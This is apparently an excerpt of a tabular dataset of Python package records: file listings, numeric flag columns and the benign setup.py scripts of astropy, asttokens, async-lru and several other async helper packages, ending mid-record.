fitsinfo.py __init__.py setup_package.py compressionmodule.c compressionmodule.h cfitsio_verify.c arange.fits ascii.fits ascii_i4-i20.fits blank.fits btable.fits chandra_time.fits checksum.fits checksum_false.fits comp.fits compressed_float_bzero.fits compressed_image.fits double_ext.fits fixed-1890.fits group.fits history_header.fits group_invalid.fits memtest.fits o4sp040b0_raw.fits random_groups.fits scale.fits stddata.fits table.fits tb.fits tdim.fits test0.fits test1.fits theap-gap.fits variable_length_table.fits verify.fits zerowidth.fits test_checksum.py test_compression_failures.py test_connect.py test_convenience.py test_core.py test_diff.py test_division.py test_fitscheck.py test_fitsdiff.py test_fitsheader.py test_fitsinfo.py test_fitstime.py test_groups.py test_hdulist.py test_header.py test_image.py test_image_dask.py test_nonstandard.py test_structured.py test_table.py test_uint.py test_util.py __init__.py util.py verify.py _utils.pyx __init__.py conftest.py connect.py angle-1.0.0.yaml earthlocation-1.0.0.ya baseframe-1.0.0 cirs-1.0.0.yaml fk4-1.0.0.yaml fk4noeterms-1.0 fk5-1.0.0.yaml galactic-1.0.0. galactocentric- gcrs-1.0.0.yaml icrs-1.0.0.yaml icrs-1.1.0.yaml itrs-1.0.0.yaml precessedgeocen latitude-1.0.0.yaml longitude-1.0.0.yaml representation-1.0.0.y skycoord-1.0.0.yaml spectralcoord-1.0.0.ya fits-1.0.0.yaml table-1.0.0.yaml timedelta-1.0.0.yaml units_mapping-1.0.0.yaml equivalency-1.0.0.yaml deprecation.py extension.py angle.py earthlocation.py frames.py representation.py skycoord.py spectralcoord.py test_angle.py test_earthlocation.py test_frames.py test_representation.py test_skycoord.py test_spectralcoord.py __init__.py __init__.py fits.py complex.fits test_fits.py __init__.py __init__.py helpers.py table.py test_table.py __init__.py __init__.py helpers.py __init__.py test_time.py test_timedelta.py __init__.py time.py timedelta.py __init__.py basic.py compound.py functional_models.py math.py physical_models.py polynomial.py powerlaws.py projections.py spline.py tabular.py test_transform.py test_units_mapping.py __init__.py __init__.py equivalency.py quantity.py test_equivalency.py test_quantity.py test_unit.py __init__.py unit.py __init__.py __init__.py test_io.py __init__.py types.py __init__.py connect.py hdf5.py connect.py __init__.py parquet.py pickle_helpers.py old_meta_example.hdf5 test_hdf5.py test_pandas.py test_parquet.py test_pickle_helpers.py test_yaml.py __init__.py yaml.py __init__.py base.py compat.py core.py interface.py test_registries.py test_registry_help.py __init__.py __init__.py mixin_columns.py safeio.py __init__.py connect.py converters.py ucd1p-words.txt VOTable.dtd VOTable.v1.1.xsd VOTable.v1.2.xsd VOTable.v1.3.xsd VOTable.v1.4.xsd exceptions.py setup_package.py .gitignore tablewriter.c table.py converter_test.py binary2_masked_strings.xml custom_datatype.xml empty_table.xml gemini.xml irsa-nph-error.xml irsa-nph-m31.xml names.xml nonstandard_units.xml no_field_not_empty_table.xml no_resource.txt no_resource.xml regression.bin.tabledata.truth.1.1.xml regression.bin.tabledata.truth.1.3.xml regression.xml resource_groups.xml tb.fits timesys.xml timesys_errors.xml too_many_columns.xml.gz validation.txt valid_votable.xml exception_test.py resource_test.py table_test.py tree_test.py ucd_test.py util_test.py vo_test.py __init__.py tree.py ucd.py util.py cone.big.dat.gz cone.broken.dat.gz cone.good.dat.gz cone.incorrect.dat.gz html.py main.py result.py __init__.py volint.py xmlutil.py __init__.py __init__.py logger.py bounding_box.py convolution.py core.py fitting.py functional_models.py mappings.py math_functions.py models.py optimizers.py parameters.py physical_models.py polynomial.py powerlaws.py projections.py rotations.py separable.py spline.py statistic.py tabular.py 1904-66_AZP.fits hst_sip.hdr idcompspec.fits irac_sip.hdr spec.txt __init__.py example_models.py irafutil.py test_bounding_box.py test_compound.py test_constraints.py test_convolution.py test_core.py test_fitters.py test_functional_models.py test_input.py test_mappings.py test_math_func.py test_models.py test_models_quantities.py test_model_sets.py test_parameters.py test_physical_models.py test_polynomial.py test_projections.py test_quantities_evaluation.py test_quantities_fitting.py test_quantities_model.py test_quantities_parameters.py test_quantities_rotations.py test_rotations.py test_separable.py test_spline.py test_statistics.py test_units_mapping.py test_utils.py __init__.py utils.py __init__.py bitmask.py blocks.py ccddata.py compat.py decorators.py flag_collection.py ndarithmetic.py ndio.py ndslicing.py test_ndarithmetic.py test_ndio.py test_ndslicing.py __init__.py __init__.py nddata.py nddata_base.py nddata_withmixins.py nduncertainty.py sip-wcs.fits test_bitmask.py test_blocks.py test_ccddata.py test_compat.py test_decorators.py test_flag_collection.py test_nddata.py test_nddata_base.py test_nduncertainty.py test_utils.py __init__.py utils.py _testing.py __init__.py client.py constants.py astropy_icon.png clientaccesspolicy.xml crossdomain.xml errors.py hub.py hub_proxy.py hub_script.py integrated_client.py lockfile_helpers.py setup_package.py standard_profile.py test_client.py test_errors.py test_helpers.py test_hub.py test_hub_proxy.py test_hub_script.py test_standard_profile.py test_web_profile.py web_profile_test_helpers.py __init__.py utils.py web_profile.py __init__.py bayesian_blocks.py biweight.py __init__.py circstats.py funcs.py histogram.py info_theory.py jackknife.py __init__.py setup_package.py sigma_clipping.py spatial.py compute_bounds.c compute_bounds.h fast_sigma_clip.c wirth_select.c wirth_select.h test_bayesian_blocks.py test_biweight.py test_circstats.py test_funcs.py test_histogram.py test_info_theory.py test_jackknife.py test_sigma_clipping.py test_spatial.py __init__.py _stats.pyx __init__.py bst.py column.py connect.py groups.py index.py info.py jsviewer.py meta.py dask.py registry.py test_dask.py test_registry.py __init__.py __init__.py ndarray_mixin.py np_utils.py operations.py pandas.py pprint.py row.py showtable.py __init__.py serialize.py setup_package.py soco.py sorted_array.py table.py table_helpers.py conftest.py test_array.py test_bst.py test_column.py test_groups.py test_index.py test_info.py test_init_table.py test_item_access.py test_jsviewer.py test_masked.py test_mixin.py test_np_utils.py test_operations.py test_pickle.py test_pprint.py test_row.py test_showtable.py test_subclass.py test_table.py __init__.py _column_mixins.pyx _np_utils.pyx __init__.py command.py helper.py image_tests.py runner.py test_imports.py test_quantity_helpers.py test_runner.py test_run_tests.py __init__.py test_logger.py __init__.py core.py formats.py setup_package.py parse_times.c test_basic.py test_comparisons.py test_corrs.py test_custom_formats.py test_delta.py test_fast_parser.py test_functions.py test_guess.py test_mask.py test_methods.py test_pickle.py test_precision.py test_quantity_interaction.py test_sidereal.py test_update_leap_seconds.py test_ut1.py __init__.py function_helpers.py __init__.py utils.py __init__.py binned.py core.py downsample.py kepler.py test_kepler.py __init__.py __init__.py base.py bls.c core.py methods.py setup_package.py test_bls.py __init__.py _impl.pyx __init__.py core.py chi2_impl.py cython_impl.pyx fastchi2_impl.py fast_impl.py main.py mle.py scipy_impl.py slow_impl.py test_mle.py test_utils.py __init__.py utils.py __init__.py test_lombscargle.py test_statistics.py test_utils.py __init__.py utils.py _statistics.py __init__.py __init__.py sampled.py binned.csv sampled.csv test_binned.py test_common.py test_downsample.py test_sampled.py __init__.py __init__.py core.py distributions.py test_distribution.py __init__.py __init__.py astrophys.py cds.py cgs.py core.py decorators.py deprecated.py equivalencies.py base.py cds.py cds_lextab.py cds_parsetab.py console.py fits.py generic.py generic_lextab.py generic_parsetab.py latex.py ogip.py ogip_lextab.py ogip_parsetab.py unicode_format.py utils.py vounit.py __init__.py core.py logarithmic.py mixin.py units.py __init__.py imperial.py misc.py photometric.py physical.py quantity.py converters.py erfa.py function_helpers.py helpers.py scipy_special.py __init__.py required_by_vounit.py si.py structured.py test_aliases.py test_deprecated.py test_equivalencies.py test_format.py test_logarithmic.py test_photometric.py test_physical.py test_quantity.py test_quantity_annotations.py test_quantity_array_methods.py test_quantity_decorator.py test_quantity_helpers.py test_quantity_non_ufuncs.py test_quantity_typing.py test_quantity_ufuncs.py test_structured.py test_structured_erfa_ufuncs.py test_units.py test_utils.py __init__.py utils.py _typing.py __init__.py argparse.py codegen.py collections.py misc.py numpycompat.py optional_deps.py __init__.py console.py data.py data_info.py decorators.py diff.py exceptions.py eopc04_IAU2000.62-now Leap_Second.dat ReadMe.eopc04_IAU2000 ReadMe.finals2000A update_builtin_iers.sh iers.py finals2000A-2016-02-30-test finals2000A-2016-04-30-test iers_a_excerpt leap-seconds.list test_iers.py test_leap_second.py __init__.py __init__.py introspection.py core.py function_helpers.py test_containers.py test_functions.py test_function_helpers.py test_masked.py test_table.py __init__.py __init__.py metadata.py misc.py parsing.py setup_package.py shapes.py compiler.c state.py .hidden_file.txt alias.cfg index.html index.html local.dat local.dat.bz2 local.dat.gz local.dat.xz foo.txt __init__.py unicode.txt unicode.txt.bz2 unicode.txt.gz unicode.txt.xz test_codegen.py test_collections.py test_console.py test_data.py test_data_info.py test_decorators.py test_diff.py test_introspection.py test_metadata.py test_misc.py test_parsing.py test_progress_bar_func.py test_shapes.py test_state.py test_xml.py __init__.py check.py iterparser.py setup_package.py .gitignore expat_config.h iterparse.c iterparse.map test_iterparse.py __init__.py unescaper.py validate.py writer.py __init__.py __init__.py version.py hist.py interval.py lupton_rgb.py mpl_normalize.py mpl_style.py fits2bitmap.py test_fits2bitmap.py __init__.py __init__.py stretch.py test_histogram.py test_interval.py test_lupton_rgb.py test_norm.py test_stretch.py test_time.py test_units.py __init__.py time.py transform.py units.py axislabels.py coordinates_map.py coordinate_helpers.py coordinate_range.py core.py formatter_locator.py frame.py grid_paths.py patches.py 2MASS_k_header cube_header msx_header rosat_header slice_header test_coordinate_helpers.py test_display_world_coordinates.py test_formatter_locator.py test_frame.py test_grid_paths.py test_images.py test_misc.py test_transforms.py test_transform_coord_meta.py test_utils.py test_wcsapi.py __init__.py ticklabels.py ticks.py transforms.py utils.py wcsapi.py __init__.py __init__.py docstrings.py .gitignore astropy_wcs.h astropy_wcs_api.h distortion.h distortion_wrap.h docstrings.h isnan.h pipeline.h pyutil.h sip.h sip_wrap.h str_list_proxy.h unit_list_proxy.h util.h wcsconfig.h wcslib_auxprm_wrap.h wcslib_celprm_wrap.h wcslib_prjprm_wrap.h wcslib_tabprm_wrap.h wcslib_units_wrap.h wcslib_wrap.h wcslib_wtbarr_wrap.h astropy_wcs_api.h wcsconfig.h .empty .gitignore cel.h lin.h prj.h spc.h spx.h tab.h wcs.h wcserr.h wcsmath.h wcsprintf.h setup_package.py .gitignore astropy_wcs.c astropy_wcs_api.c distortion.c distortion_wrap.c docstrings.c pipeline.c pyutil.c sip.c sip_wrap.c str_list_proxy.c unit_list_proxy.c util.c wcslib_auxprm_wrap.c wcslib_celprm_wrap.c wcslib_prjprm_wrap.c wcslib_tabprm_wrap.c wcslib_wrap.c wcslib_wtbarr_wrap.c conftest.py 2wcses.hdr 3d_cd.hdr chandra-pixlist-wcs.hdr defunct_keywords.hdr dist.fits dist_lookup.fits.gz dss.14.29.56-62.41.05.fits.gz header_newlines.fits header_with_time.fits header_with_time_wcslib71.fits ie6d07ujq_wcs.fits invalid_header.hdr irac_sip.hdr j94f05bgq_flt.fits locale.hdr 1904-66_AIR.hdr 1904-66_AIT.hdr 1904-66_ARC.hdr 1904-66_AZP.hdr 1904-66_BON.hdr 1904-66_CAR.hdr 1904-66_CEA.hdr 1904-66_COD.hdr 1904-66_COE.hdr 1904-66_COO.hdr 1904-66_COP.hdr 1904-66_CSC.hdr 1904-66_CYP.hdr 1904-66_HPX.hdr 1904-66_MER.hdr 1904-66_MOL.hdr 1904-66_NCP.hdr 1904-66_PAR.hdr 1904-66_PCO.hdr 1904-66_QSC.hdr 1904-66_SFL.hdr 1904-66_SIN.hdr 1904-66_STG.hdr 1904-66_SZP.hdr 1904-66_TAN.hdr 1904-66_TSC.hdr 1904-66_ZEA.hdr 1904-66_ZPN.hdr nonstandard_units.hdr outside_sky.hdr sip-broken.hdr sip.fits sip2.fits siponly.hdr orion-freq-1.hdr orion-freq-4.hdr orion-velo-1.hdr orion-velo-4.hdr orion-wave-1.hdr orion-wave-4.hdr sub-segfault.hdr tab-time-last-axis.fits too_many_pv.hdr tpvonly.hdr unit.hdr validate.5.0.txt validate.5.13.txt validate.6.txt validate.7.4.txt validate.7.6.txt validate.fits validate.txt zpn-hole.hdr helper.py test_auxprm.py test_celprm.py test_pickle.py test_prjprm.py test_profiling.py test_tab.py test_tabprm.py test_utils.py test_wcs.py test_wcsprm.py test_wtbarr.py __init__.py utils.py wcs.py conftest.py ucds.txt fitswcs.py high_level_api.py high_level_wcs_wrapper.py low_level_api.py sliced_low_level_wcs.py test_fitswcs.py test_high_level_api.py test_high_level_wcs_wrapper.py test_low_level_api.py test_utils.py __init__.py utils.py base.py sliced_wcs.py test_sliced_wcs.py __init__.py __init__.py __init__.py wcslint.py __init__.py _compiler.c __init__.py _version.py __init__.py dependency_links.txt entry_points.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt azure-pipelines.yml .gitignore changes.txt buffers.c cfileio.c checksum.c drvrfile.c drvrmem.c drvrnet.c drvrsmem.c drvrsmem.h editcol.c edithdu.c eval_defs.h eval_f.c eval_l.c eval_tab.h eval_y.c fitscore.c fitsio.h fitsio2.h fits_hcompress.c fits_hdecompress.c getcol.c getcolb.c getcold.c getcole.c getcoli.c getcolj.c getcolk.c getcoll.c getcols.c getcolsb.c getcolui.c getcoluj.c getcoluk.c getkey.c group.c group.h grparser.c grparser.h histo.c imcompress.c iraffits.c longnam.h modkey.c pliocomp.c putcol.c putcolb.c putcold.c putcole.c putcoli.c putcolj.c putcolk.c putcoll.c putcols.c putcolsb.c putcolu.c putcolui.c putcoluj.c putcoluk.c putkey.c quantize.c region.c region.h ricecomp.c scalnull.c simplerng.c simplerng.h swapproc.c wcssub.c wcsutil.c zcompress.c zuncompress.c License.txt README.txt adler32.c crc32.c crc32.h deflate.c deflate.h infback.c inffast.c inffast.h inffixed.h inflate.c inflate.h inftrees.c inftrees.h trees.c trees.h uncompr.c zconf.h zlib.h zutil.c zutil.h .gitignore AUTHORS Changes COPYING expat_config.h expat_config.h.in .gitignore ascii.h asciitab.h expat.h expat_external.h iasciitab.h internal.h latin1tab.h libexpat.def libexpatw.def Makefile.am Makefile.in nametab.h siphash.h utf8tab.h winconfig.h xmlparse.c xmlrole.c xmlrole.h xmltok.c xmltok.h xmltok_impl.c xmltok_impl.h xmltok_ns.c README.md README.txt README.rst trim_cfitsio.sh trim_expat.sh trim_wcslib.sh cel.c cel.h dis.c dis.h fitshdr.h fitshdr.l fitshdr.c README wcsbth.c wcspih.c wcsulex.c wcsutrn.c getwcstab.c getwcstab.h GNUmakefile lin.c lin.h log.c log.h prj.c prj.h spc.c spc.h sph.c sph.h spx.c spx.h tab.c tab.h wcs.c wcs.h wcsbth.l wcserr.c wcserr.h wcsfix.c wcsfix.h wcshdr.c wcshdr.h wcslib.h wcsmath.h wcspih.l wcsprintf.c wcsprintf.h wcstrig.c wcstrig.h wcsulex.l wcsunits.c wcsunits.h wcsutil.c wcsutil.h wcsutrn.l wtbarr.h CHANGES config.guess config.sub install-sh configure configure.ac COPYING COPYING.LESSER flavours GNUmakefile INSTALL makedefs.in makelog README THANKS VALIDATION wcsconfig.h.in wcsconfig_f77.h.in wcsconfig_tests.h.in wcsconfig_utils.h.in wcslib.pc.in CHANGES.rst CITATION codecov.yml CODE_OF_CONDUCT.md conftest.py CONTRIBUTING.md changelog.rst .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep README.rst .gitkeep .gitkeep .gitkeep template.rst .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep .gitkeep common_links.txt conf.py astropy_config.rst index.rst conftest.py index.rst performance.inc.rst astropy.png original.png scipy.png index.rst kernels.rst non_normalized_kernels.rst performance.inc.rst using.rst angles.rst apply_space_motion.rst common_errors.rst definitions.rst formatting.rst frames.rst galactocentric.rst index.rst inplace.rst matchsep.rst performance.inc.rst remote_methods.rst representations.rst satellites.rst skycoord.rst solarsystem.rst spectralcoord.rst transforming.rst velocities.rst dev.rst index.rst io.rst units.rst credits.rst astropy-package-template.rst building.rst ccython.rst codeguide.rst codeguide_emacs.rst docguide.rst docrules.rst releasing.rst scripts.rst style-guide.rst testguide.rst vision.rst when_to_rebase.rst additional_git_topics.rst branch_dropdown.png development_workflow.rst forking_button.png get_devel_version.rst git_edit_workflow_examples.rst git_install.rst git_links.inc git_resources.rst links.inc maintainer_workflow.rst patches.rst pull_button.png this_project.inc virtual_pythons.rst worked_example_switch_branch.png getting_started.rst glossary.rst importing_astropy.rst index.rst install.rst base_classes.rst ecsv.rst extension_classes.rst fast_ascii_io.rst fixed_width_gallery.rst index.rst performance.inc.rst read.rst references.txt toc.txt write.rst asdf-schemas.rst cards.rst diff.rst files.rst hdulists.rst hdus.rst headers.rst images.rst tables.rst verification.rst faq.rst header_transition.rst history.rst index.rst performance.inc.rst headers.rst image.rst misc.rst scripts.rst table.rst unfamiliar.rst verification.rst misc.rst registry.rst unified.rst .gitignore api_exceptions.rst index.rst performance.inc.rst references.txt known_issues.rst license.rst logging.rst lts_policy.rst make.bat Makefile add-units.rst compound-models.rst example-fitting-constraints.rst example-fitting-line.rst example-fitting-model-sets.rst fitting.rst index.rst jointfitter.rst links.inc models.rst new-fitter.rst new-model.rst parameters.rst performance.rst physical_models.rst polynomial_models.rst powerlaw_models.rst predef_models1D.rst predef_models2D.rst reference_api.rst spline_models.rst units.rst bitmask.rst ccddata.rst decorator.rst cutout2d_tofits.py index.rst index.rst ndarithmetic.rst ndio.rst ndslicing.rst nddata.rst performance.inc.rst subclassing.rst utils.rst nitpick-exceptions overview.rst robots.txt advanced_embed_samp_hub.rst example_clients.rst example_hub.rst example_table_image.rst index.rst performance.inc.rst circ.rst index.rst performance.inc.rst ripley.rst robust.rst access_table.rst construct_table.rst implementation_details.rst index.rst indexing.rst io.rst masking.rst mixin_columns.rst modify_table.rst operations.rst pandas.rst performance.inc.rst table_architecture.png table_repr_html.png table_row.png table_show_in_nb.png testhelpers.rst index.rst performance.inc.rst time_scale_conversion.odg time_scale_conversion.png analysis.rst binned.csv bls.rst data_access.rst index.rst initializing.rst io.rst lombscargle.rst masking.rst pandas.rst sampled.csv times.rst index.rst performance.inc.rst combining_and_defining.rst constants_versions.rst conversion.rst decomposing_and_composing.rst equivalencies.rst format.rst index.rst logarithmic_units.rst performance.inc.rst physical_types.rst quantity.rst standard_units.rst structured_units.rst type_hints.rst data.rst iers.rst index.rst index.rst histogram.rst index.rst matplotlib_integration.rst normalization.rst performance.inc.rst rgb.rst controlling_axes.rst custom_frames.rst generic_transforms.rst images_contours.rst index.rst initializing_axes.rst overlaying_coordinate_systems.rst overlays.rst slicing_datacubes.rst ticks_labels_grid.rst warnings.rst cube_wcs.py from_file.py programmatic.py example_create_imaging.rst example_cube_wcs.rst history.rst index.rst legacy_interface.rst loading_from_fits.rst note_sip.rst performance.inc.rst references.rst references.txt reference_api.rst relax.rst supported_projections.rst validation.rst wcsapi.rst wcstools.rst 0.1.rst 0.2.rst 0.3.rst 0.4.rst 1.0.rst 1.1.rst 1.2.rst 1.3.rst 2.0.rst 3.0.rst 3.1.rst 3.2.rst 4.0.rst 4.1.rst 4.2.rst 4.3.rst 5.0.rst 5.1.rst index.rst _pkgtemplate.rst astropy_banner.svg astropy_banner_96.png astropy_logo.pdf layout.html plot_galactocentric-frame.py plot_obs-planning.py plot_sgr-coordinate-frame.py README.txt rv-to-gsr.py create-mef.py fits-tables.py Hs-2009-14-a-web.jpg modify-fits-header.py plot_fits-image.py README.txt skip_create-large-fits.py split-jpeg-to-fits.py README.rst example-template.py GOVERNANCE.md LICENSE.rst AURA_LICENSE.rst CONFIGOBJ_LICENSE.rst DATATABLES_LICENSE.rst ERFA.rst EXPAT_LICENSE.rst JQUERY_LICENSE.rst NUMPY_LICENSE.rst PLY_LICENSE.rst PYFITS.rst PYTHON.rst README.rst WCSLIB_LICENSE.rst MANIFEST.in pip-requirements PKG-INFO pyproject.toml README.rst setup.cfg setup.py tox.ini,"#!/usr/bin/env python
# Licensed under a 3-clause BSD style license - see LICENSE.rst

# NOTE: The configuration for the package, including the name, version, and
# other information are set in the setup.cfg file.

import sys

# First provide helpful messages if contributors try and run legacy commands
# for tests or docs.

TEST_HELP = """"""
Note: running tests is no longer done using 'python setup.py test'. Instead
you will need to run:

    tox -e test

If you don't already have tox installed, you can install it with:

    pip install tox

If you only want to run part of the test suite, you can also use pytest
directly with::

    pip install -e .[test]
    pytest

For more information, see:

  https://docs.astropy.org/en/latest/development/testguide.html#running-tests
""""""

if 'test' in sys.argv:
    print(TEST_HELP)
    sys.exit(1)

DOCS_HELP = """"""
Note: building the documentation is no longer done using
'python setup.py build_docs'. Instead you will need to run:

    tox -e build_docs

If you don't already have tox installed, you can install it with:

    pip install tox

You can also build the documentation with Sphinx directly using::

    pip install -e .[docs]
    cd docs
    make html

For more information, see:

  https://docs.astropy.org/en/latest/install.html#builddocs
""""""

if 'build_docs' in sys.argv or 'build_sphinx' in sys.argv:
    print(DOCS_HELP)
    sys.exit(1)


# Only import these if the above checks are okay
# to avoid masking the real problem with import error.
from setuptools import setup  # noqa
from extension_helpers import get_extensions  # noqa

setup(ext_modules=get_extensions())
",1
asttokens-2.0.7,0,1,1,1,1,0,0,0,build-and-test.yml .gitignore .pylintrc asttokens.py line_numbers.py mark_tokens.py py.typed util.py version.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt api-index.rst conf.py docs_requirements.txt index.rst Makefile user-guide.rst LICENSE Makefile MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py context.py absimport.py all.py clientmodule_test.py descriptor_crash.py email.py format.py joined_strings.py module.py module2.py noendingnewline.py nonregr.py notall.py recursion.py suppliermodule_test.py __init__.py absimport.py all.py clientmodule_test.py descriptor_crash.py email.py format.py joined_strings.py module.py module2.py noendingnewline.py nonregr.py notall.py recursion.py suppliermodule_test.py __init__.py README.md test_astroid.py test_asttokens.py test_line_numbers.py test_mark_tokens.py test_util.py tools.py __init__.py tox.ini,"""""""A setuptools based setup module.

See:
https://packaging.python.org/en/latest/distributing.html
https://github.com/pypa/sampleproject
""""""

from setuptools import setup

if __name__ == ""__main__"":
    setup()
",1
astunparse-1.6.3,0,1,1,1,1,0,0,0,AUTHORS.rst CONTRIBUTING.rst HISTORY.rst printer.py unparser.py __init__.py __main__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst requirements.txt setup.cfg setup.py common.py test_dump.py test_unparse.py __init__.py test_requirements.txt,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
import sys
import os
import re
from setuptools import setup, find_packages

readme = open('README.rst').read()
history = open('HISTORY.rst').read().replace('.. :changelog:', '')


def read_reqs(name):
    with open(os.path.join(os.path.dirname(__file__), name)) as f:
        return [line for line in f.read().split('\n') if line and not line.strip().startswith('#')]

tests_require = []  # mostly handled by tox
if sys.version_info < (2, 7):
    tests_require.append(""unittest2 == 0.5.1"")  # except this

def read_version():
    with open(os.path.join('lib', 'astunparse', '__init__.py')) as f:
        m = re.search(r'''__version__\s*=\s*['""]([^'""]*)['""]''', f.read())
        if m:
            return m.group(1)
        raise ValueError(""couldn't find version"")


setup(
    name='astunparse',
    version=read_version(),
    description='An AST unparser for Python',
    long_description=readme + '\n\n' + history,
    maintainer='Simon Percivall',
    maintainer_email='percivall@gmail.com',
    url='https://github.com/simonpercivall/astunparse',
    packages=find_packages('lib'),
    package_dir={'': 'lib'},
    include_package_data=True,
    install_requires=read_reqs('requirements.txt'),
    license=""BSD"",
    zip_safe=False,
    keywords='astunparse',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Natural Language :: English',
        ""Programming Language :: Python :: 2"",
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development :: Code Generators',
    ],
    test_suite='tests',
    tests_require=tests_require,
)
",1
async_exit_stack-1.0.1,0,1,1,1,1,0,0,0,_async_exit_stack.py __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt CONTRIBUTING.rst HISTORY.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_async_exit_stack.py __init__.py,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

""""""The setup script.""""""

from setuptools import setup, find_packages

with open('README.rst') as readme_file:
    readme = readme_file.read()

with open('HISTORY.rst') as history_file:
    history = history_file.read()

requirements = [ ]

setup_requirements = [ ]

test_requirements = [ ]

setup(
    author=""Davide Rizzo"",
    author_email='sorcio@gmail.com',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: Python Software Foundation License',
        'Natural Language :: English',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
    ],
    description=""AsyncExitStack backport for Python 3.5+"",
    install_requires=requirements,
    license=""Python Software Foundation License"",
    long_description=readme + '\n\n' + history,
    include_package_data=True,
    keywords='async_exit_stack',
    name='async_exit_stack',
    packages=find_packages(include=['async_exit_stack']),
    python_requires='>=3.5',
    setup_requires=setup_requirements,
    test_suite='tests',
    tests_require=test_requirements,
    url='https://github.com/sorcio/async_exit_stack',
    version='1.0.1',
    zip_safe=False,
)
",0
async-lru-1.0.3,0,1,1,1,0,0,0,0,dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt async_lru.py LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"import io
import os
import re

from setuptools import setup


def get_version():
    regex = r""__version__\s=\s\""(?P<version>[\d\.ab]+?)\""""

    path = (""async_lru.py"",)

    return re.search(regex, read(*path)).group(""version"")


def read(*parts):
    filename = os.path.join(os.path.abspath(os.path.dirname(__file__)), *parts)

    with io.open(filename, encoding=""utf-8"", mode=""rt"") as fp:
        return fp.read()


setup(
    name=""async-lru"",
    version=get_version(),
    author=""Victor Kovtun"",
    author_email=""hellysmile@gmail.com"",
    url=""https://github.com/aio-libs/async_lru"",
    description=""Simple lru_cache for asyncio"",
    long_description=read(""README.rst""),
    py_modules=[""async_lru""],
    include_package_data=True,
    zip_safe=False,
    python_requires="">=3.6"",
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
    ],
    keywords=[""asyncio"", ""lru"", ""lru_cache""],
)
",0
async_property-0.2.1,0,1,1,1,1,0,0,0,base.py cached.py loader.py proxy.py __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt CONTRIBUTING.rst conf.py contributing.rst history.rst index.rst installation.rst make.bat Makefile readme.rst HISTORY.rst LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_asyncio_lock.py test_async_cached_property.py test_async_property.py test_inheritance.py test_loader.py __init__.py,"#!/usr/bin/env python
""""""The setup script.""""""

from setuptools import setup, find_packages

with open('README.rst') as readme_file:
    readme = readme_file.read()

with open('HISTORY.rst') as history_file:
    history = history_file.read()

requirements = []

setup_requirements = ['pytest-runner']

test_requirements = ['pytest']

setup(
    author=""Ryan Anguiano"",
    author_email='ryan.anguiano@gmail.com',
    classifiers=[
        'Development Status :: 2 - Pre-Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Natural Language :: English',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
    ],
    description=""Python decorator for async properties."",
    install_requires=requirements,
    license=""MIT license"",
    long_description=readme + '\n\n' + history,
    include_package_data=True,
    keywords='async_property',
    name='async_property',
    packages=find_packages(include=['async_property']),
    setup_requires=setup_requirements,
    test_suite='tests',
    tests_require=test_requirements,
    url='https://github.com/ryananguiano/async_property',
    version='0.2.1',
    zip_safe=False,
)
",1
async-timeout-4.0.2,0,1,1,1,1,0,0,0,py.typed __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe CHANGES.rst LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py test_timeout.py,"from setuptools import setup


setup()
",1
asyncache-0.1.1,0,1,1,0,1,0,0,0,__init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt .gitignore conf.py index.rst Makefile LICENSE MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_cached.py tox.ini,"from setuptools import find_packages, setup


setup(
    name=""asyncache"",
    version=""0.1.1"",
    url=""https://github.com/hephex/asyncache"",
    license=""MIT"",
    author=""Hephex"",
    description=""Helpers to use cachetools with async functions"",
    long_description=open(""README.rst"").read(),
    keywords=""cache caching memoize memoizing memoization async"",
    packages=find_packages(exclude=[""tests"", ""tests.*""]),
    install_requires=[""cachetools>=2.1""],
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Other Environment"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ],
)
",0
asyncinit-0.2.4,0,1,1,1,1,0,0,0,__init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup

setup(
